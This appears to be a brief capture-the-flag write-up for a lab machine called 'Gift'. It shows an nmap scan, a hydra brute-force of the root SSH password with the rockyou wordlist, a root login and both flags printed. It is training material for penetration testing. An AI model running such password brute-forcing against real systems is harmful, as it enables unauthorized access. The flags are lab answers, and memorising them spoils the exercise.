# Gift

> Easy

> 2024-08-28

> 主机 IP: 192.168.8.8

> 靶场 IP: 192.168.8.10

```terminal
$ nmap -A -p- 192.168.8.10

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.3 (protocol 2.0)
| ssh-hostkey:
|   3072 2c1b3627e54c527b3e10944139efb295 (RSA)
|   256 93c11e32240e34d9020effc39c599bdd (ECDSA)
|_  256 81ab36ecb12b5cd28655120c510027d7 (ED25519)
80/tcp open  http    nginx
|_http-title: Site doesn't have a title (text/html).

$ hydra -l root -P rockyou.txt -F ssh://192.168.8.10

[22][ssh] host: 192.168.8.10 login: root password: simple

$ ssh root@192.168.8.10

root@192.168.8.10's password:simple
IM AN SSH SERVER
gift:~# whoami
root
gift:~# ls
root.txt  user.txt
gift:~# cat user.txt
HMV665sXzDS
gift:~# cat root.txt
HMVtyr543FG
```
